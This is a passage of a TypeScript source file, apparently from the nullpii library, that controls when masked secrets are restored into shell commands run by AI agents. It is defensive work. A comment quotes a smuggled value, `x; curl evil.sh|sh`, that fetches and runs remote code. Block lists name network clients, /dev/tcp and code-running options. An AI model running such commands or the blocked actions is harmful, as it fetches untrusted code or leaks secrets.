// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, a value
 * comes back only into a command written in a small grammar read whole
 * (`advance`): words, single quotes, double quotes without `$`, a backtick
 * or a backslash, `&&`, `||`, `|`, `;`, line breaks, redirections and
 * heredocs. Anything else (any `$`, backticks, backslashes, parentheses,
 * braces, comments, a lone `&` (also `&>`), `>!`, `>>&`, `;;`, `[[`, `<<<`,
 * control characters, U+2028/U+2029, a heredoc operator with no body, a reserved word
 * such as `if` or `case` where a program could stand) keeps every
 * placeholder: shells disagree on how such
 * constructs nest and end. Within that grammar, every program must be on a
 * closed list of programs that read their arguments as data
 * (`ARG_DATA_PROGRAMS`), and a value comes back only as one plain word:
 * letters, digits and `@%+:,./_=-`, not starting with `-`, `=` or `~`.
 * Otherwise the placeholder stays literal, and the command works on the
 * placeholder text, which is harmless.
 *
 * On top of that:
 * - a listed program counts only by name exactly as written, with no
 *   wrapper, no path, no redirection before it, no assignment other than
 *   the locale or time zone with a plain value (`SAFE_ASSIGNMENT`; before
 *   it, or as a command of its own: `PATH=…; grep …`), and with none of the options that run, write or set a variable
 *   (`COMMAND_OPTIONS`, abbreviations and short-option clusters included);
 * - a placeholder that is, or is part of, the program a simple command
 *   runs, a redirection target, an assignment, an argument of `export` or
 *   `alias`, a `cd` argument, or a placeholder written in shell code
 *   directly before `<` or `>` stays
 *   masked: a value must not choose what runs, what is written or the
 *   directory later commands (git among them) run in;
 * - within the list, a command that sends data off the machine (a URL,
 *   `/dev/tcp`) or runs code through an option (`find -exec`, `rg --pre`,
 *   `git -c`) keeps every placeholder, also when judged again with the
 *   values put back, and so does one that writes any file but a document
 *   (`PLAIN_DATA_FILE`; `/dev/null` and the standard streams are no
 *   file), or a relative file in a command that also runs `cd`;
 * - judged again with the values put back, the command must also split
 *   into the same simple commands and heredoc bodies as before, or it
 *   keeps every placeholder;
 * - the one exception to the plain-word rule is the body of a heredoc that
 *   `cat` writes to standard output or to a document file (`.md`, `.csv`,
 *   …; `PLAIN_DATA_FILE`), or that `git commit -F -` reads as its message,
 *   in a command that runs nothing else that could read it as code
 *   (`cat > notes.md <<'EOF'`, `git commit -F - <<'EOF'`): that body is
 *   data, as a file the `Write` tool writes is, so only a line break or
 *   another control character but tab is refused (and in a
 *   bare-delimiter body, `$`, a backtick or a backslash). The network checks skip such a body, so a commit message
 *   that mentions `ssh` does not count as a network call.
 *
 * The command is read once, in time linear in its length, whatever the
 * number of placeholders; a command longer than `MAX_COMMAND_CHARS`, with
 * a simple command past the read window (more than `MAX_WORD_SCAN`
 * characters, or `MAX_WORDS` words or more, heredoc bodies not counted),
 * or with a heredoc body
 * whose closing line cannot be found keeps every placeholder, and one whose
 * quoting is left open loses the heredoc exception. `<<` counts only in shell code, never
 * inside quotes. A `command` given as an argv array
 * (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`. The Claude
 * Code mod gets the same rules through the sidecar's `restore` with
 * `tool`.
 *
 * Best effort for what leaves the machine: no list names every network
 * client, and a value restored into a file (`Write`, `Edit`) can be sent
 * by a later command.
 */

/** Tools whose input a shell runs, as each agent names them: Claude
 * Code's `Bash`, Anthropic's bash tool (`bash`), and the `shell` tool of
 * OpenAI-style agents such as Codex. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';
/** The other input fields of a shell tool that get values back: text
 * shown to the user. Any other field (`workdir`, `cwd`, `env`, `timeout`
 * or one nullpii does not know) keeps its placeholders: it can set where
 * or how the command runs, which a `cd` argument or an assignment in the
 * command never gets to. */
export const SHELL_TEXT_FIELDS: ReadonlySet<string> = new Set(['description', 'justification']);

/** Where a placeholder stands. `heredoc` is the body of a quoted-delimiter
 * heredoc and `heredoc-expanding` that of a bare one, both only while the
 * body is data (see `DATA_PROGRAMS`); any other body is `none`. */
export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc' | 'heredoc-expanding';

/** The contexts of a data heredoc body. */
type DataBodyContext = 'heredoc' | 'heredoc-expanding';

/** Contexts that hold data a program writes out, not shell code. */
const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set<DataBodyContext>([
  'heredoc',
  'heredoc-expanding',
]);

/** A value that may be restored outside a data heredoc body: one plain
 * word, with no character any shell or quoting gives a meaning to, and
 * not starting with `-` (an option), `=` (zsh's `=cmd` expansion) or `~`
 * (a home directory). */
const PLAIN_WORD = /^(?![-=~])[\p{L}\p{N}@%+:,./_=-]+$/u;

/** What a value may hold in a data heredoc body. */
const DATA_BODY_SAFE: Readonly<Record<DataBodyContext, RegExp>> = {
  // A quoted-delimiter body is literal: it ends only at a line that reads
  // as the delimiter. A value with no line break can still complete such a
  // line (a value `EOF` alone on its line); the second reading in
  // `restoreShellCommand` sees the body end early and keeps every value.
  // Control characters but tab are refused per value: the second reading
  // would refuse the whole command for them (`UNREAD_CHARACTERS`).
  // biome-ignore lint/suspicious/noControlCharactersInRegex: refusing them is the point.
  heredoc: /^[^\u0000-\u0008\u000a-\u001f\u007f-\u009f\u2028\u2029]*$/u,
  // biome-ignore lint/suspicious/noControlCharactersInRegex: refusing them is the point.
  'heredoc-expanding': /^[^$`\\\u0000-\u0008\u000a-\u001f\u007f-\u009f\u2028\u2029]*$/u,
};

/** Longest command read: a longer one keeps every placeholder, so the
 * work per tool call stays bounded whatever the model sends. */
export const MAX_COMMAND_CHARS = 256 * 1024;

/** The rest of one simple command, up to a bound: from an interpreter's
 * name to its code flag, past other options and their arguments. */
const SAME_COMMAND = String.raw`[^;&|\n]{0,256}?`;

/** Interpreter names, for the patterns that look inside quoted code. */
const INTERPRETER_NAMES = String.raw`(?:bash|sh|zsh|dash|ksh|mksh|yash|posh|csh|tcsh|fish|python[\d.]*|pypy[\d.]*|node|nodejs|bun|deno|perl|ruby|lua|php|Rscript|osascript|pwsh|powershell)`;

/** A program name standing as a whole word: not part of a path segment,
 * a file name (`sed.txt`) or a longer name (`ssh-keygen`, `~/.ssh`). */
const NAME_START = String.raw`(?<![\w.-])`;
const NAME_END = String.raw`(?![\w.-])`;

/** Code handed to an interpreter, read on the whole text so that it is
 * found where no program is read, inside an argument or a quoted string
 * (`docker run img sh -c "…"`, `find . -exec bash -c '…'`). Each code
 * flag may follow other options (`bash -o pipefail -c`); a flag cluster
 * counts when it holds the code letter (`-lc`). The program a command
 * itself runs is judged by name (`CODE_RUNNERS`). */
const NESTED_INTERPRETER = new RegExp(
  [
    String.raw`${NAME_START}(?:bash|sh|zsh|dash|ksh|mksh|yash|posh|csh|tcsh|fish)${NAME_END}${SAME_COMMAND}\s(?:-[A-Za-z]*c[A-Za-z]*|--command)\b`,
    String.raw`${NAME_START}(?:pwsh|powershell)${NAME_END}${SAME_COMMAND}\s-`,
    String.raw`${NAME_START}(?:eval|ssh)${NAME_END}|${NAME_START}(?:su|runuser|flock|script)${NAME_END}${SAME_COMMAND}\s(?:-c|--command)\b`,
    String.raw`${NAME_START}(?:python[\d.]*|pypy[\d.]*)${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*c[A-Za-z]*\b`,
    String.raw`${NAME_START}(?:node|nodejs|bun|deno)${NAME_END}${SAME_COMMAND}\s(?:-[A-Za-z]*[ep][A-Za-z]*|--eval|--print|eval)\b`,
    String.raw`${NAME_START}(?:perl|ruby|lua|Rscript|osascript)${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*[eE][A-Za-z]*\b`,
    String.raw`${NAME_START}php${NAME_END}${SAME_COMMAND}\s-[A-Za-z]*r[A-Za-z]*\b`,
    String.raw`\|&?\s*(?:sudo\s+)?(?:\S*/)?${INTERPRETER_NAMES}${NAME_END}`,
    String.raw`${NAME_START}${INTERPRETER_NAMES}${NAME_END}${SAME_COMMAND}(?:<<<|[<>]\()`,
    String.raw`${NAME_START}(?:awk|gawk|mawk|nawk|sed)${NAME_END}`,
  ].join('|'),
);

/** Programs that run code given to them, in their arguments, their input
 * or a file: a value anywhere in a command that runs one may be read as
 * code. Lower case, without a version suffix (`python3.12` → `python`). */
const CODE_RUNNERS: ReadonlySet<string> = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'fish',
  'csh',
  'tcsh',
  'busybox',
  'python',
  'pypy',
  'node',
  'nodejs',
  'bun',
  'deno',
  'tsx',
  'ts-node',
  'perl',
  'ruby',
  'irb',
  'lua',
  'luajit',
  'php',
  'rscript',
  'r',
  'julia',
  'osascript',
  'pwsh',
  'powershell',
  'tclsh',
  'expect',
  'awk',
  'gawk',
  'mawk',
  'nawk',
  'sed',
  'gsed',
  'eval',
  'source',
  '.',
  'xargs',
  'watch',
  'parallel',
  'flock',
  'script',
  'su',
  'runuser',
  'tmux',
  'screen',
  'at',
  'batch',
  'entr',
  'make',
  'gmake',
  'just',
  'npx',
  'pnpx',
  'bunx',
  'hyperfine',
  'gdb',
  'trap',
  'pipx',
  'emacs',
  'nix-shell',
  'crontab',
  'systemctl',
  'launchctl',
]);

/** Programs that run code through some subcommands (`uv run`, `npm exec`,
 * `docker run`); a command counts when any of its words is one. */
const CODE_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['uv', new Set(['run', 'tool'])],
  ['uvx', new Set<string>()],
  ['pnpm', new Set(['exec', 'dlx', 'run', 'test', 'start'])],
  ['yarn', new Set(['exec', 'dlx', 'run', 'test', 'start'])],
  ['bun', new Set(['run', 'x', 'test'])],
  ['poetry', new Set(['run'])],
  ['pipenv', new Set(['run'])],
  ['bundle', new Set(['exec'])],
  ['nix', new Set(['run', 'shell', 'develop'])],
  ['cargo', new Set(['run', 'test'])],
  ['go', new Set(['run', 'test', 'generate'])],
  ['docker', new Set(['run', 'exec'])],
  ['podman', new Set(['run', 'exec'])],
  [
    'git',
    new Set([
      '-c',
      '--config-env',
      'config',
      'filter-branch',
      'rebase',
      'bisect',
      'difftool',
      'mergetool',
    ]),
  ],
  ['npm', new Set(['exec', 'run', 'run-script', 'test', 'start', 'x', 'config', 'set'])],
  ['defaults', new Set(['write', 'import'])],
]);

/** A pattern for a long option and every abbreviation of it from `min`
 * characters (one by default), as getopt_long and git's parse-options accept
 * (`--out` for `--output`), with or without `=value`. */
function longOption(name: string, min = 1): string {
  const tail = name
    .slice(min)
    .split('')
    .reduceRight((rest, ch) => `(?:${escapeRe(ch)}${rest})?`, '');
  return `^--${escapeRe(name.slice(0, min))}${tail}(?:=|$)`;
}

function escapeRe(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function optionPattern(...parts: string[]): RegExp {
  return new RegExp(parts.join('|'));
}

/** A short option anywhere in a cluster after one `-`, at any length:
 * getopt and git read each character as an option, digits included,
 * until one takes an argument (`git grep -n3O<pager>`). */
function shortOption(letter: string): string {
  return `^-(?!-)[\\s\\S]*${escapeRe(letter)}`;
}

/** Options that make an otherwise plain program run a command it is given
 * (`find -exec`, `tar -I`, `zip -TT`, `git -c core.pager=…`), write where
 * an argument points (`sort -o`) or set a shell variable (`stat -A`). */
const COMMAND_OPTIONS: ReadonlyMap<string, RegExp> = new Map([
  // `-rm` is bfs's spelling of `-delete` (Claude Code's `find` may be bfs).
  ['find', /^-(?:exec|execdir|ok|okdir|delete|rm|fprint|fprint0|fprintf|fls)$/],
  [
    'git',
    optionPattern(
      shortOption('O'),
      longOption('open-files-in-pager'),
      longOption('output'),
      longOption('ext-diff'),
    ),
  ],
  [
    'tar',
    optionPattern(
      shortOption('I'),
      '^--(?:use-compress-program|to-command|checkpoint-action|info-script|new-volume-script)',
    ),
  ],
  ['zip', /^-TT|^--unzip-command/],
  ['rsync', optionPattern(shortOption('e'), '^--rsh')],
  ['less', optionPattern(shortOption('+'), '^\\+')],
  // ripgrep takes no abbreviations; `--pre-glob` runs nothing without `--pre`.
  ['rg', /^--pre(?:=|$)|^--hostname-bin(?:=|$)/],
  ['man', optionPattern(shortOption('P'), '^--pager')],
  // Writing where an option points chooses what is overwritten.
  ['sort', optionPattern(shortOption('o'), longOption('output'), longOption('compress-program'))],
  ['base64', optionPattern(shortOption('o'), longOption('output'))],
  // `file -C` writes a file.
  ['file', optionPattern(shortOption('C'), longOption('compile'))],
  // Builtins a shell can load in their place set a variable through these:
  // zsh's `zsh/stat` (`stat -A`/`-H NAME`), bash's loadable `stat`,
  // `realpath -a` and `cut -a`. GNU and macOS builds have none of these letters.
  ['stat', optionPattern(shortOption('A'), shortOption('H'))],
  ['realpath', optionPattern(shortOption('a'))],
  ['cut', optionPattern(shortOption('a'))],
  ['fzf', /^--(?:preview|bind)/],
]);

/** Programs that run the program named after their own options, with the
 * options that take a separate argument. */
const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['sudo', new Set(['-u', '-g', '-h', '-p', '-r', '-t', '-C', '-D', '-U', '-T'])],
  ['doas', new Set(['-u', '-C'])],
  ['env', new Set(['-u', '-C', '--unset', '--chdir'])],
  ['nohup', new Set<string>()],
  ['command', new Set<string>()],
  ['builtin', new Set<string>()],
  ['exec', new Set(['-a'])],
  ['time', new Set(['-f', '-o', '--format', '--output'])],
  ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['gtimeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['ionice', new Set(['-c', '-n', '-p', '-P', '-u'])],
  ['stdbuf', new Set(['-i', '-o', '-e'])],
  ['setsid', new Set<string>()],
  ['unbuffer', new Set<string>()],
  ['caffeinate', new Set(['-t', '-w'])],
  ['chronic', new Set<string>()],
  ['xargs', new Set(['-I', '-n', '-P', '-L', '-d', '-E', '-s', '-a'])],
  ['strace', new Set(['-o', '-e', '-p', '-s', '-u'])],
  ['ltrace', new Set(['-o', '-e', '-p', '-s', '-u'])],
  ['valgrind', new Set<string>()],
  ['chroot', new Set<string>()],
  ['taskset', new Set<string>()],
  ['numactl', new Set<string>()],
  ['chrt', new Set<string>()],
  ['faketime', new Set<string>()],
  ['unshare', new Set<string>()],
  ['nsenter', new Set(['-t', '--target'])],
  ['systemd-run', new Set<string>()],
  ['pkexec', new Set(['--user'])],
  ['firejail', new Set<string>()],
  ['bwrap', new Set<string>()],
  ['proxychains', new Set(['-f'])],
  ['proxychains4', new Set(['-f'])],
  ['torsocks', new Set<string>()],
  ['flatpak-spawn', new Set<string>()],
]);

/** Wrappers that take a positional argument before the program
 * (`timeout 5 cmd`). */
const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([
  ['timeout', 1],
  ['gtimeout', 1],
  ['chroot', 1],
  ['taskset', 1],
  ['chrt', 1],
  ['faketime', 1],
]);

/** Wrapper options that make it run a shell on a string, not a program
 * (`sudo -s`, `sudo -i`, `env -S "…"`). */
const WRAPPER_SHELL_OPTION: ReadonlyMap<string, RegExp> = new Map([
  ['sudo', /^-[A-Za-z]*[is]|^--(?:shell|login)$/],
  ['env', /^-[A-Za-z]*S|^--split-string/],
]);

/** Programs that send what they are given off the machine. Lower case. */
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
  'curl',
  'curlie',
  'wget',
  'aria2c',
  'http',
  'https',
  'httpie',
  'xh',
  'nc',
  'nc.openbsd',
  'nc.traditional',
  'ncat',
  'netcat',
  'socat',
  'telnet',
  'ssh',
  'scp',
  'sftp',
  'rsync',
  'ftp',
  'lftp',
  'tftp',
  'ncftp',
  'websocat',
  'wscat',
  'grpcurl',
  'gh',
  'glab',
  'hub',
  'dig',
  'nslookup',
  'host',
  'drill',
  'kdig',
  'ping',
  'traceroute',
  'tracepath',
  'mtr',
  'whois',
  'nmap',
  'mail',
  'mailx',
  'sendmail',
  'mutt',
  'msmtp',
  'swaks',
  'aws',
  'gcloud',
  'gsutil',
  'bq',
  'az',
  'doctl',
  'oci',
  'kubectl',
  'helm',
  'oc',
  'heroku',
  'fly',
  'flyctl',
  'vercel',
  'netlify',
  'wrangler',
  'firebase',
  'supabase',
  'rclone',
  's3cmd',
  'smbclient',
  'psql',
  'mysql',
  'mariadb',
  'mongosh',
  'mongo',
  'redis-cli',
  'sqlcmd',
  'sqlplus',
  'clickhouse-client',
  'ldapsearch',
  'ldapmodify',
  'ssh-keyscan',
  'getent',
  'arp',
  'huggingface-cli',
  'hf',
  'ollama',
  'open',
  'xdg-open',
  'gio',
  'start',
  'iwr',
  'irm',
  'invoke-webrequest',
  'invoke-restmethod',
]);

/** Programs that send data out only through some of their subcommands;
 * a command counts when any of its words is one. */
const NETWORK_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  [
    'git',
    new Set([
      'push',
      'pull',
      'fetch',
      'clone',
      'ls-remote',
      'remote',
      'submodule',
      'send-email',
      'request-pull',
    ]),
  ],
  ['docker', new Set(['push', 'pull', 'login'])],
  ['podman', new Set(['push', 'pull', 'login'])],
  ['buildah', new Set(['push', 'pull', 'login'])],
  [
    'npm',
    new Set([
      'publish',
      'login',
      'adduser',
      'install',
      'i',
      'add',
      'ci',
      'update',
      'view',
      'info',
      'show',
      'search',
    ]),
  ],
  ['pnpm', new Set(['publish', 'login', 'install', 'i', 'add', 'update'])],
  ['yarn', new Set(['publish', 'login', 'npm', 'install', 'add', 'up'])],
  ['bun', new Set(['publish', 'install', 'i', 'add'])],
  ['cargo', new Set(['publish', 'login', 'install', 'add'])],
  ['gem', new Set(['push', 'signin', 'install'])],
  ['twine', new Set(['upload'])],
  ['poetry', new Set(['publish', 'add', 'install'])],
  ['uv', new Set(['publish', 'add', 'pip', 'sync'])],
  ['pip', new Set(['install', 'download'])],
  ['pip3', new Set(['install', 'download'])],
  ['go', new Set(['get', 'install'])],
  ['brew', new Set(['install', 'fetch', 'tap'])],
  ['apt', new Set(['install', 'download'])],
  ['apt-get', new Set(['install', 'download'])],
  ['openssl', new Set(['s_client', 's_server', 'ocsp'])],
]);

/** Network clients found anywhere in the text, inside quoted code too:
 * names that cannot be anything else (not after `.`, `/`… so `~/.ssh`
 * does not count), uploads by `git` and package managers, and `/dev/tcp`.
 * Best effort: no list names every way out. */
const NETWORK_CLIENT = new RegExp(
  [
    /(?<![\w.-])(?:curl|wget|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|aria2c|nslookup|traceroute|sendmail|mailx|websocat|wscat|grpcurl|gcloud|gsutil|kubectl|rclone|s3cmd|smbclient)(?![\w-])/
      .source,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod)\b/.source,
    String.raw`\bgit\b${SAME_COMMAND}\s(?:push|pull|fetch|clone|ls-remote|remote|submodule|send-email)\b`,
    String.raw`\b(?:npm|pnpm|yarn|bun|cargo)\b${SAME_COMMAND}\spublish\b`,
    /\/dev\/(?:tcp|udp)\//.source,
  ].join('|'),
  'i',
);

/** A URL: handed to a program that is not a data one, it may be opened. */
const URL_SCHEME = /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\//i;

/** In a command that runs code: a URL, a networking library, or a short
 * network client name, which that code may use. */
const NETWORK_IN_CODE =
  /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;

/** Programs whose arguments and input are data, so that a heredoc body
 * in a command that runs only these is data too. */
const DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'cat',
  'echo',
  'mkdir',
  'cd',
  'touch',
  'ls',
  'pwd',
  'true',
  ':',
]);

/** The programs a value may be restored into: each reads its arguments
 * as data, opens no connection and runs no code it is handed. A command
 * that runs any other program keeps every placeholder: no list can name
 * every program that sends data out or runs code, so the default is to
 * restore nothing. Programs that write where an argument says (`cp`,
 * `mv`, `rm`, `tee`, `install`) are left out, so a value cannot choose
 * what is overwritten or deleted. */
const ARG_DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'ls',
  'cat',
  'head',
  'tail',
  'wc',
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'find',
  'stat',
  'file',
  'du',
  'df',
  'diff',
  'cmp',
  'sort',
  'cut',
  'tr',
  'jq',
  'echo',
  'mkdir',
  'cd',
  'pwd',
  'touch',
  'basename',
  'dirname',
  'realpath',
  'readlink',
  'sha256sum',
  'sha1sum',
  'md5sum',
  'shasum',
  'base64',
  'column',
  'nl',
  'true',
  'false',
  ':',
]);

// `printf`, `test` and `[` are left off: zsh and ksh93 may read their
// arguments as arithmetic, which can assign a variable for every later
// command, in more forms than a rule can list. `echo` prints a value.

/** `git` subcommands a value may be restored into. */
const ARG_DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'log',
  'status',
  'diff',
  'show',
  'add',
  'commit',
  'blame',
  'grep',
  'ls-files',
  'rev-parse',
]);

/** `git` subcommands that read their arguments as data and run no code
 * on them, so a commit message heredoc in `git add … && git commit …`
 * stays data. */
const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'commit',
  'add',
  'status',
  'diff',
  'log',
  'show',
]);

/** Programs whose code can be ended by any character, letters included,
 * and that can then run a command: `sed`'s `s` takes any delimiter and an
 * `e` flag, `perl`'s `s///e` too. Not even a plain word is safe in their
 * code, so a command that runs one keeps every placeholder. */
const ANY_DELIMITER_PROGRAMS: ReadonlySet<string> = new Set(['sed', 'gsed', 'perl', 'ruby', 'irb']);
const ANY_DELIMITER_IN_TEXT = /(?<![\w.-])(?:g?sed|perl|ruby|irb)(?![\w.-])/;

/** A redirection operator at the start of a word, with its descriptor. */
const REDIRECTION_OPERATOR =
  /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)/;

/** Shell builtins whose arguments set what later commands run or see
 * (`export LD_PRELOAD=…`, `alias ll=…`): a value is never restored there. */
const ENVIRONMENT_BUILTINS: ReadonlySet<string> = new Set([
  'export',
  'declare',
  'typeset',
  'local',
  'readonly',
  'alias',
  'set',
  'unset',
  'shopt',
]);

/** Files a shell, git or a hook runner executes later: a heredoc written
 * to one is code, not data. */
const EXECUTED_LATER =
  /(?:^|[\s/'"])(?:\.git\/hooks\/|\.husky\/|\.githooks\/|\.(?:bash|zsh|ksh|mksh|tcsh|csh)rc\b|\.(?:bash_)?profile\b|\.zprofile\b|\.zshenv\b|\.zlogin\b|\.envrc\b|\.config\/fish\/|crontab\b|(?:private\/)?etc\/|s?bin\/|LaunchAgents\/|systemd\/)/i;

/** A `>&` target that copies or closes a descriptor rather than naming a
 * file. */
const DESCRIPTOR_TARGET = /^(?:\d+|-)$/;
/** Redirection targets that are no file a later command could read. */
const NO_FILE_TARGETS: ReadonlySet<string> = new Set(['/dev/null', '/dev/stdout', '/dev/stderr']);
/** Characters that end a redirection target word outside quotes. */
const TARGET_ENDS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '<',
  '>',
  '(',
  ')',
]);
/** A document a data heredoc may be written to: no hidden directory or
 * file on its path (`./` and `../` aside), and a text extension no tool
 * reads as code or input by its name. Not `.txt`: pip reads requirements
 * and constraints files, CMake `CMakeLists.txt`, pytest `test*.txt`, and
 * a relative `base.txt` lands in whatever directory an earlier command
 * left (`requirements/`), which nullpii does not see. Case is ignored, as
 * on the default macOS and Windows file systems. */
const PLAIN_DATA_FILE = /^(?!.*(?:^|\/)\.(?!\.?\/))[\w./+-]*\.(?:md|markdown|csv|tsv|log|rst)$/i;

/** True when the redirection target `target` is a document: a file no
 * shell, build tool or test runner reads as code or configuration. */
function isDocument(target: string): boolean {
  return PLAIN_DATA_FILE.test(target);
}
/** Characters read of a redirection target: a longer one is no document. */
const MAX_TARGET_CHARS = 256;
/** The characters a shell splits words on by default (`IFS`). */
const FIELD_SEPARATORS: ReadonlySet<string> = new Set([' ', '\t', '\n']);

/** Programs that make a file executable, to run it. */
const RUNS_FILE_PROGRAMS: ReadonlySet<string> = new Set(['chmod']);

/** How many words of a simple command are read, and how far: enough for
 * wrappers, the program and its subcommand, bounded on long input. */
const MAX_WORDS = 64;
const MAX_WORD_SCAN = 4096;

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR =
  /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))(?=[ \t\n;&|<>()]|$)/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat']);
/** `git commit` options that read the message from standard input. */
const STDIN_MESSAGE_FLAGS: ReadonlySet<string> = new Set(['-F-', '--file=-']);
/** `git commit` options whose next word names the message file. */
const MESSAGE_FILE_FLAGS: ReadonlySet<string> = new Set(['-F', '--file']);

/** Characters after which a new simple command starts (see
 * `separatesCommands`). */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n']);
/** Outside single quotes: expansions, substitutions and escapes, which the
 * grammar read leaves out. */
const UNREAD_OUTSIDE_SINGLE: ReadonlySet<string> = new Set(['$', '`', '\\']);
/** In shell code: subshells, groups and brace expansions. */
const UNREAD_IN_CODE: ReadonlySet<string> = new Set(['(', ')', '{', '}']);
/** Shell reserved words: a simple command that starts with one is a
 * compound command or a keyword the grammar read leaves out. */
const RESERVED_WORDS: ReadonlySet<string> = new Set([
  'if',
  'then',
  'else',
  'elif',
  'fi',
  'case',
  'esac',
  'for',
  'select',
  'while',
  'until',
  'do',
  'done',
  'in',
  'function',
  'time',
  'coproc',
  '!',
  '[[',
  ']]',
  '{',
  '}',
]);
/** Control characters other than tab and line feed, and Unicode line
 * separators: shells drop, keep or split on them differently (a NUL is
 * discarded, a carriage return becomes part of a word), so a command that
 * holds one is not read. */
// biome-ignore lint/suspicious/noControlCharactersInRegex: matching them is the point.
const UNREAD_CHARACTERS = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u2028\u2029]/;
/** What makes a bare-delimiter heredoc body expand. */
const BODY_EXPANSION = /[$`\\]/;

/** Characters after which a `#` begins a word, and so a comment, which is
 * outside the grammar read (`outsideGrammar`): the command then keeps
 * every placeholder. Wider than any shell's rule, which only keeps more. */
const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '(',
  ')',
  '<',
  '>',
  '`',
]);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
/** Assignments a command with listed programs may make, each with a
 * plain value: `LANG` and `LC_*` set to `C`, `POSIX` or a locale with an
 * explicit UTF-8 codeset (`C.UTF-8`, `en_US.UTF-8`), since a shell told to
 * use another multibyte encoding (GBK, Big5, Shift JIS) would read the
 * command's bytes differently; `LANGUAGE` (message catalogs only) set to
 * names separated by `:` (`en_US:en`); `TZ` set to a zone name (`UTC`,
 * `Europe/Rome`). Each part starts with a letter, digit or `_`: a path
 * (`..` included: libintl looks catalogs up under `<localedir>/<value>/`)
 * or an expression could choose what is loaded or evaluated. */
const SAFE_ASSIGNMENT =
  /^(?:(?:LANG|LC_[A-Z]+)=(?:C|POSIX|(?:C|[A-Za-z]{2,3}(?:_[A-Za-z]{2})?)\.(?:UTF-8|utf-8|UTF8|utf8)(?:@[A-Za-z0-9]+)?)?|LANGUAGE=(?:[A-Za-z0-9_][A-Za-z0-9_.@-]*(?::[A-Za-z0-9_][A-Za-z0-9_.@-]*)*)?|TZ=(?:[A-Za-z0-9_][A-Za-z0-9_+-]*(?:\/[A-Za-z0-9_][A-Za-z0-9_+-]*)*)?)$/;
const LEADING_TABS = /^\t+/;
/** The start of a word that a following `<` or `>` continues: nothing,
 * a descriptor number, or the operator so far (`2>`, `>`, `<`). */
const REDIRECTION_HEAD = /^\d*[<>]*$/;
/** A redirection word (`>`, `2>>log`, `&>`, `<in`, `<'a b'` with its
 * quotes removed); group 1 is empty when the operator stands alone and
 * its target is the next word. */
const REDIRECTION =
  /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)([\s\S]*)$/;
/** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;

type FrameKind = 'code' | 'single' | 'double';

/** One level of quoting. In the code frame, `cmdStart` is where the
 * current simple command began. */
interface Frame {
  readonly kind: FrameKind;
  cmdStart: number;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` or as `git commit -F -`'s message, and not piped on,
   * so the body is data. */
  readonly data: boolean;
}

/** One pass over a command: the context at each target position, in
 * order, and the extent of every simple command met in shell code. */
interface Scan {
  readonly targets: readonly number[];
  readonly contexts: QuoteContext[];
  readonly commands: Array<readonly [number, number]>;
  /** The extent of every heredoc body written out as data. */
  readonly dataBodies: Array<readonly [number, number]>;
